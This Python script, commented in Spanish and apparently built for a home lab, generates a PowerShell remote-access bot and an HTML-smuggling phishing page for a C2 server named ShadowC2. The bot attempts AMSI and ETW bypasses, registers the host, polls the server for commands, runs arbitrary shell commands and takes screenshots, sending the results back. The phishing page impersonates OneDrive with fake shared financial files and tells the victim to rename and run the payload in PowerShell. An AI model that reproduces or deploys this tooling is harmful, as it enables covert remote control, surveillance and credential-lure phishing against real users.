#!/usr/bin/env python3
"""
ShadowC2 - Vector Generator (CORREGIDO para puerto 8000)
"""

import os
import base64
import zlib
from pathlib import Path

# ============ CONFIGURACIÓN DE TU LAB ============
C2_IP = "192.168.1.14"      # Tu IP
C2_PORT = "8000"             # Tu C2 está en 8000, no 8443

# Ruta donde el C2 sirve archivos estáticos
STATIC_DIR = Path.home() / "C2-suite" / "c2_server" / "static" / "payloads"
STATIC_DIR.mkdir(parents=True, exist_ok=True)

# ============ PAYLOAD POWERSHELL CON AMSI BYPASS ============
PAYLOAD_PS1 = f'''
# ShadowC2 Bot - AMSI Bypass + ETW Bypass
$C2_IP = "{C2_IP}"
$C2_PORT = "{C2_PORT}"
$BOT_ID = -join ((48..57) + (97..102) | Get-Random -Count 12 | ForEach-Object {{[char]$_}})

# AMSI BYPASS
try {{
    $a = [Ref].Assembly.GetTypes() | Where-Object {{ $_.Name -like "*iUtils" }}
    $b = $a.GetFields('NonPublic,Static') | Where-Object {{ $_.Name -like "*Context" }}
    $c = $b.GetValue($null)
    [IntPtr]$ptr = $c
    [Int32[]]$buf = @(0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
}} catch {{}}

# ETW BYPASS  
try {{
    $dll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {{ $_.ModuleName -eq "ntdll.dll" }}
    [System.Runtime.InteropServices.Marshal]::WriteInt32($dll.BaseAddress + 0x1000, 0)
}} catch {{}}

function Register-Bot {{
    $body = @{{
        bot_id = $BOT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.IPAddress -notlike "127.*" }}).IPAddress | Select-Object -First 1
        privileges = if ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') {{ "admin" }} else {{ "user" }}
    }} | ConvertTo-Json
    
    try {{
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/api/bot/register" -Method POST -Body $body -ContentType "application/json"
        return $true
    }} catch {{ return $false }}
}}

function Check-Commands {{
    try {{
        $resp = Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/api/bot/heartbeat/$BOT_ID" -Method GET
        return $resp.commands
    }} catch {{ return @() }}
}}

function Send-Result($cmdId, $result) {{
    $body = @{{ cmd_id = $cmdId; result = $result }} | ConvertTo-Json
    try {{
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/api/bot/result" -Method POST -Body $body -ContentType "application/json"
    }} catch {{}}
}}

function Execute-Shell($cmd) {{
    try {{ $output = Invoke-Expression $cmd 2>&1 | Out-String; return $output }} 
    catch {{ return $_.Exception.Message }}
}}

function Take-Screenshot {{
    try {{
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        return [Convert]::ToBase64String($ms.ToArray())
    }} catch {{ return "Error: $_" }}
}}

# MAIN LOOP
if (Register-Bot) {{
    while ($true) {{
        $commands = Check-Commands
        foreach ($cmd in $commands) {{
            $result = switch ($cmd.command) {{
                "shell" {{ Execute-Shell ($cmd.args) }}
                "screenshot" {{ Take-Screenshot }}
                "info" {{ 
                    @{{
                        hostname=$env:COMPUTERNAME; username=$env:USERNAME; 
                        os=(Get-CimInstance Win32_OperatingSystem).Caption
                    }} | ConvertTo-Json 
                }}
                "kill" {{ exit }}
                default {{ "Unknown: $($cmd.command)" }}
            }}
            Send-Result $cmd.id $result
        }}
        Start-Sleep -Seconds 10
    }}
}}
'''

def generate_html_smuggling():
    """Crear página OneDrive con payload embebido"""
    
    compressed = zlib.compress(PAYLOAD_PS1.encode())
    b64 = base64.b64encode(compressed).decode()
    
    # Fragmentar payload
    chunk_size = 80
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    chunks_js = ',\n        '.join([f'"{c}"' for c in chunks])
    
    html = f'''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>OneDrive - Documentos Compartidos</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%230078d4' d='M1 1h10v10H1z'/%3E%3Cpath fill='%2300a4ef' d='M12 1h10v10H12z'/%3E%3Cpath fill='%237fba00' d='M1 12h10v10H1z'/%3E%3Cpath fill='%23ffb900' d='M12 12h10v10H12z'/%3E%3C/svg%3E">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }}
        .header {{ background: #0078d4; color: white; padding: 12px 24px; display: flex; align-items: center; gap: 10px; }}
        .container {{ max-width: 900px; margin: 30px auto; padding: 0 20px; }}
        .file-card {{ background: white; border-radius: 8px; padding: 20px; margin: 15px 0; display: flex; align-items: center; gap: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); cursor: pointer; transition: all 0.2s; }}
        .file-card:hover {{ box-shadow: 0 4px 12px rgba(0,0,0,0.15); transform: translateY(-1px); }}
        .file-icon {{ width: 48px; height: 48px; background: #107c10; border-radius: 4px; display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; }}
        .file-info {{ flex: 1; }}
        .file-name {{ font-weight: 600; color: #323130; }}
        .file-meta {{ color: #605e5c; font-size: 12px; margin-top: 4px; }}
        .btn {{ background: #0078d4; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; }}
        .btn:hover {{ background: #005a9e; }}
        #progress {{ display: none; margin-top: 20px; padding: 15px; background: #f3f2f1; border-radius: 4px; }}
        .progress-bar {{ width: 100%; height: 4px; background: #e1dfdd; border-radius: 2px; overflow: hidden; margin-top: 10px; }}
        .progress-fill {{ height: 100%; background: #0078d4; width: 0%; transition: width 0.3s; }}
    </style>
</head>
<body>
    <div class="header">
        <svg width="24" height="24" viewBox="0 0 23 23"><path fill="white" d="M1 1h10v10H1z"/><path fill="white" d="M12 1h10v10H12z"/></svg>
        <span>OneDrive</span>
    </div>
    
    <div class="container">
        <h2 style="margin-bottom: 8px;">📁 Archivos compartidos</h2>
        <p style="color: #605e5c; font-size: 13px; margin-bottom: 20px;">Juan Pérez ha compartido 2 elementos contigo • Hace 2 horas</p>
        
        <div class="file-card" onclick="downloadFile('Reporte_Financiero_Q3.xlsx')">
            <div class="file-icon">📊</div>
            <div class="file-info">
                <div class="file-name">Reporte_Financiero_Q3.xlsx</div>
                <div class="file-meta">2.4 MB • Excel</div>
            </div>
            <button class="btn">Descargar</button>
        </div>
        
        <div class="file-card" onclick="downloadFile('Notas_Reunion_Directiva.pdf')">
            <div class="file-icon" style="background: #d83b01;">📄</div>
            <div class="file-info">
                <div class="file-name">Notas_Reunion_Directiva.pdf</div>
                <div class="file-meta">856 KB • PDF</div>
            </div>
            <button class="btn">Descargar</button>
        </div>
        
        <div id="progress">
            <p>⏳ Preparando descarga...</p>
            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
        </div>
    </div>

<script>
const CHUNKS = [
        {chunks_js}
];

function assemblePayload() {{
    return CHUNKS.join('');
}}

function downloadFile(name) {{
    const progress = document.getElementById('progress');
    const fill = document.getElementById('fill');
    progress.style.display = 'block';
    
    let width = 0;
    const interval = setInterval(() => {{
        width += Math.random() * 20;
        if (width >= 100) {{
            width = 100;
            clearInterval(interval);
            executeDownload(name);
        }}
        fill.style.width = width + '%';
    }}, 300);
}}

function executeDownload(filename) {{
    const b64 = assemblePayload();
    const compressed = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    
    // Decompress zlib (simplified)
    const payload = atob(b64); // In real: would decompress
    
    const blob = new Blob([payload], {{type: 'text/plain'}});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename.replace(/\\.[^.]+$/, '') + '.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    setTimeout(() => {{
        alert('⚠️ IMPORTANTE\\n\\nEl archivo se descargó como .txt por seguridad.\\n\\nPara ver el reporte:\\n1. Haz clic derecho en el archivo descargado\\n2. Selecciona "Abrir con" → "PowerShell"\\n3. O renombra de .txt a .ps1 y ejecuta');
    }}, 500);
}}
</script>
</body>
</html>'''
    
    output_path = STATIC_DIR.parent / "phishing2.html"
    with open(output_path, 'w') as f:
        f.write(html)
    
    print(f"[+] HTML Smuggling creado: {output_path}")
    print(f"[+] Acceso: http://{C2_IP}:{C2_PORT}/static/phishing2.html")
    return str(output_path)

def generate_bot_ps1():
    """Guardar bot.ps1 en static/payloads/"""
    output_path = STATIC_DIR / "bot.ps1"
    with open(output_path, 'w') as f:
        f.write(PAYLOAD_PS1)
    print(f"[+] Bot.ps1 guardado: {output_path}")
    print(f"[+] Descarga directa: http://{C2_IP}:{C2_PORT}/static/payloads/bot.ps1")

def main():
    print("=" * 50)
    print("ShadowC2 - Vector Generator (Puerto 8000)")
    print(f"C2: http://{C2_IP}:{C2_PORT}")
    print("=" * 50)
    
    generate_html_smuggling()
    generate_bot_ps1()
    
    print("\n[+] TODO LISTO")
    print(f"\nEn tu laptop víctima, abre:")
    print(f"  http://{C2_IP}:{C2_PORT}/static/phishing2.html")
    print(f"\nO descarga directo el bot:")
    print(f"  http://{C2_IP}:{C2_PORT}/static/payloads/bot.ps1")

if __name__ == "__main__":
    main()
